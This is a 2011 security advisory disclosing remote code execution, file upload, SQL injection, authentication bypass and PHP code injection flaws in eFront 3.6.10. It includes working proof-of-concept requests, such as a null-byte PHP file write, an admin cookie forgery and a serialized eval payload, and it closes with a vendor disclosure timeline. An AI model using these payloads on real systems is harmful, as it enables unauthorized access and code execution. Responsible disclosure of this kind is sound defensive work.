@@ -1,0 +1,227 @@
+  ----------------------------------------------------------------
+  eFront <= 3.6.10 (build 11944) Multiple Security Vulnerabilities
+  ----------------------------------------------------------------
+  
+  author.............: EgiX
+  mail...............: n0b0d13s[at]gmail[dot]com
+  software link......: http://www.efrontlearning.net/
+  tested versions....: 3.6.7 - 3.6.9 - 3.6.10
+  
+  +-----------------------+
+  | Remote Code Execution |
+  +-----------------------+
+  
+  The vulnerable code is located in /www/editor/tiny_mce/plugins/save_template/save_template.php
+  
+  8.	if ($_POST['templateName']) {
+  9.		$dir = '../../../../content/editor_templates/'.$_SESSION['s_login'];
+  10.		if (!is_dir($dir) && !mkdir($dir, 0755)) {
+  11.			throw new Exception(_COULDNOTCREATEDIRECTORY);
+  12.		}
+  13.	
+  14.		$filename = $dir.'/'.$_POST['templateName'].'.html';
+  15.		$templateContent = $_POST['templateContent'];
+  16.		if(file_exists($filename) === false) {
+  17.			$ok = file_put_contents($filename, $templateContent);
+  18.			chmod($filename, 0644);
+  
+  Input passed through $_POST['templateName'] and $_POST['templateContent'] isn't sanitized before being
+  used in a call to file_put_contents() at line 17, this can be exploited to write arbitrary PHP code in
+  a file with .php extension also if magic_quotes_gpc = on. Proof of concept request:
+  
+   POST /efront/www/editor/tiny_mce/plugins/save_template/save_template.php HTTP/1.1
+   Host: localhost
+   Content-Length: 60
+   Content-Type: application/x-www-form-urlencoded
+   Connection: keep-alive
+
+   templateName=sh.php%00&templateContent=<?php evil_code(); ?>
+   
+  Successful exploitation of this vulnerability doesn't require authentication.
+  
+  +--------------------------+
+  | Unrestricted File Upload |
+  +--------------------------+
+  
+  The vulnerable code is located in /libraries/filesystem.class.php
+  
+  3143.	    public static function checkFile($name) {
+  3144.	    if ($GLOBALS['configuration']['file_black_list'] != '') {
+  3145.	         $blackList = explode(",", $GLOBALS['configuration']['file_black_list']);
+  3146.	    } else {
+  3147.	      $blackList = array();
+  3148.	    }
+  3149.	    $blackList[] = 'php';
+  3150.	        $extension = pathinfo($name, PATHINFO_EXTENSION);
+  3151.	        foreach ($blackList as $value) {
+  3152.	            if ($extension == trim(mb_strtolower($value))) {
+  3153.	                throw new EfrontFileException(_YOUCANNOTUPLOADFILESWITHTHISEXTENSION.': '.$extension, EfrontFileException::FILE_IN_BLACK_LIST);
+  3154.	            }
+  
+  The FileSystemTree::uploadFile() method handles all uploads and It uses checkFile() method to verify the extension
+  of the uploaded file. Here is compared the uploaded file extension with every extension in the 'file_black_list' array,
+  that is constructed by this default configuration: "php,php3,jsp,asp,cgi,pl,exe,com,bat" and, as you can see, It doesn't
+  contains others dangerous extension like phtml, pwml, php4, php5, inc... But the really problem is that at line 3152
+  the uploaded file extension is simply compared with == operator, so an attacker could be able to upload for e.g. an
+  avatar with .PHP extension. This is possible only if 'file_white_list' configuration is blank (such as by default).
+  
+  +-----------------------------------+
+  | SQL Injection in UPDATE statement |
+  +-----------------------------------+
+   
+  First look at the getUserTimeTarget() function defined into /libraries/tools.php
+  
+  2776.	function getUserTimeTarget($url) {
+  2777.	 //return $_SESSION['s_time_target'];
+  2778.	 if (isset($_SESSION['s_lessons_ID']) && $_SESSION['s_lessons_ID']) {
+  2779.	  $entity = array($_SESSION['s_lessons_ID'] => 'lesson');
+  2780.	 } else {
+  2781.	  $entity = array(0 => 'system');
+  2782.	 }
+  2783.	 $urlParts = parse_url($url);
+  2784.	 $queryParts = explode('&', $urlParts['query']);
+  2785.	 foreach($queryParts as $part) {
+  2786.	  $result = explode("=", $part);
+  2787.	  switch ($result[0]) {
+  2788.	   case 'view_unit':
+  2789.	   case 'package_ID': $entity = array($result[1] => 'unit'); break;
+  2790.	   default: break;
+  2791.	  }
+  2792.	 }
+  2793.	 return $entity;
+  2794.	}
+  
+  It parses the given URL, and if in the query string is defined a 'package_ID' variable his content is
+  used as a key for the $entity array. Now look the vulnerable code located in /www/periodic_updater.php
+  
+  32.	 if ($_SESSION['s_login']) {
+  33.	  $entity = getUserTimeTarget($_GET['HTTP_REFERER']);
+  34.	  //$entity = $_SESSION['s_time_target'];
+  35.	   //Update times for this entity
+  36.	  $result = eF_executeNew("update user_times set time=time+(".time()."-timestamp_now),timestamp_now=".time()."
+  37.	        where session_expired = 0 and session_custom_identifier = '".$_SESSION['s_custom_identifier']."' and users_LOGIN = '".$_SESSION['s_login']."'
+  38.	         and entity = '".current($entity)."' and entity_id = '".key($entity)."'");
+  
+  Input passed through $_GET['HTTP_REFERER'] is passed to getUserTimeTarget() function at line 33 and the return value is
+  used in call to eF_executeNew() at line 38. So an attacker could request an URL like this to inject arbitrary SQL code:
+  
+   http://localhost/efront/www/periodic_updater.php?HTTP_REFERER=http://host/?package_ID=[SQL]
+  
+  In older version input is taken from $_SERVER['HTTP_REFERER'] instead of $_GET['HTTP_REFERER'], but is still vulnerable.
+  Successful exploitation of this vulnerability requires authentication.
+  
+  +---------------+
+  | SQL Injection |
+  +---------------+
+  
+  The vulnerable code is located in /www/js/LMSFunctions.php
+  
+  13.	/*These lines read SCO data for this student and pass them to the javascript code through the LMSToSCOValues variable*/
+  14.	$result = eF_getTableData("scorm_data", "*", "users_LOGIN = '".$_SESSION['s_login']."' AND content_ID = '".$_GET['view_unit']."'");
+  15.	sizeof($result) ? $LMSToSCOValues = $result[0] : $LMSToSCOValues = array();
+  
+  Input passed through $_GET['view_unit'] isn't properly sanitized before being used in a call
+  to eF_getTableData() function at line 14, this can be exploited to inject arbitrary SQL code.
+  Successful exploitation of this vulnerability doesn't require authentication or magic_quotes_gpc = off.
+    
+  +---------------+
+  | SQL Injection |
+  +---------------+
+  
+  The vulnerable code is located in /www/send_notifications.php
+  
+  69.	} else if (isset($_GET['sent_notification_id'])) {
+  70.	 $sent_notification = eF_getTableData("sent_notifications", "*", "id = " . $_GET['sent_notification_id']);
+  71.	 if (!empty ($sent_notification)) {
+  
+  Input passed through $_GET['sent_notification_id'] isn't properly sanitized before being used in a
+  call to eF_getTableData() function at line 70, this can be exploited to inject arbitrary SQL code.
+  Successful exploitation of this vulnerability doesn't require authentication or magic_quotes_gpc = off.
+  
+  +------------------------------------------------+
+  | Authentication Bypass and Privilege Escalation |
+  +------------------------------------------------+
+  
+  The vulnerable code is located in /www/index.php
+  
+  206.	if (isset($_COOKIE['cookie_login']) && isset($_COOKIE['cookie_password'])) {
+  207.	 try {
+  208.	  $user = EfrontUserFactory :: factory($_COOKIE['cookie_login']);
+  209.	  $user -> login($_COOKIE['cookie_password'], true);
+  
+  Input passed through $_COOKIE['cookie_login'] isn't properly sanitized before being used at
+  line 208 to instanciate a new user object using EfrontUserFactory::factory() method, this can
+  be exploited to bypass authentication and to escalate privilege. Proof of concept request:
+  
+   GET /efront/www/index.php HTTP/1.1
+   Host: localhost
+   Cookie: cookie_login[login]=admin;cookie_login[active]=1;cookie_login[user_type]=administrator;cookie_login[password]=1;cookie_password=1
+   Connection: keep-alive
+   
+  +--------------------+
+  | PHP Code Injection |
+  +--------------------+
+  
+  The vulnerable code is located in /www/student.php
+  
+  123.	     if (isset($_GET['course']) || isset($_GET['from_course'])) {
+  124.	            if ($_GET['course']) {
+  125.	          $course = new EfrontCourse($_GET['course']);
+  126.	            } else {
+  127.	             $course = new EfrontCourse($_GET['from_course']);
+  128.	            }
+  129.	            $eligibility = $course -> checkRules($_SESSION['s_login']);
+  
+  Input passed through $_GET['course'] (or $_GET['from_course']) isn't properly sanitized before being
+  used to instantiate a new EfrontCourse object, this can be exploited to inject and execute arbitrary
+  PHP code because of EfrontCourse::checkRules() method calls eval() function using the 'rules' object's
+  property (see /libraries/course.class.php near lines 3638-3645). Successful exploitation of this
+  vulnerability requires at least a student account with at least one completed lesson.
+  Proof of concept request:
+  
+   /student.php?lessons_ID=1&course[id]=1&course[directions_ID]=1&course[rules]=a:1:{s:19:"1];phpinfo();die;/*";a:1:{s:6:"lesson";i:0;}}
+  
+  
+  [-] Conclusion:
+  
+  The latest two vulnerabilities emphasizes a critical design flaw. To understand what I means look
+  at the constructor method of EfrontEntity (a generic class used as parent for some objects):
+  
+  64.	    public function __construct($param) {
+  65.	        if (!$this -> entity) {
+  66.	            $this -> entity = strtolower(str_replace('Efront', '', get_class($this)));
+  67.	        }
+  68.	        if (!is_array($param)) {
+  69.	         if (!eF_checkParameter($param, 'id')) {
+  70.	             throw new EfrontEntityException(_INVALIDID.': '.$param, EfrontEntityException :: INVALID_ID);
+  71.	         }
+  72.	         $result = eF_getTableData($this -> entity, "*", "id=$param");
+  73.	         if (sizeof($result) == 0) {
+  74.	             throw new EfrontEntityException(_ENTITYNOTFOUND.': '.htmlspecialchars($param), EfrontEntityException :: ENTITY_NOT_EXIST);
+  75.	         }
+  76.	         $this -> {$this -> entity} = $result[0];
+  77.	        } else {
+  78.	            $this -> {$this -> entity} = $param;
+  79.	        }
+  80.	    }
+  
+  If the $param variable is an array, It's used to initialize all the object properties and this
+  mechanism is used in almost all classes. So everytime in the code will appear something like
+  
+   $object = new EfrontObject($_GET['param']);
+   
+  and $_GET['param'] isn't properly sanitized, there is an high probability to lead in bugs such as
+  SQL Injection, PHP Code Injection, LFI etc... because an attacker could pass parameter in array
+  form and so he might be able to change the internal property of the objects with arbitrary data.
+  So I think that could there be some other bugs, for this reason I would recommend to the eFront
+  developers a complete source code review focused on security.
+  
+  
+  [-] Disclosure timeline:
+  
+  [08/10/2011] - Vulnerabilities discovered
+  [09/10/2011] - Others vulnerabilities discovered
+  [11/10/2011] - Issues reported to http://bugs.efrontlearning.net/browse/EF-675
+  [26/10/2011] - Vendor update released: http://forum.efrontlearning.net/viewtopic.php?t=3501
+  [27/10/2011] - Public disclosure
+  
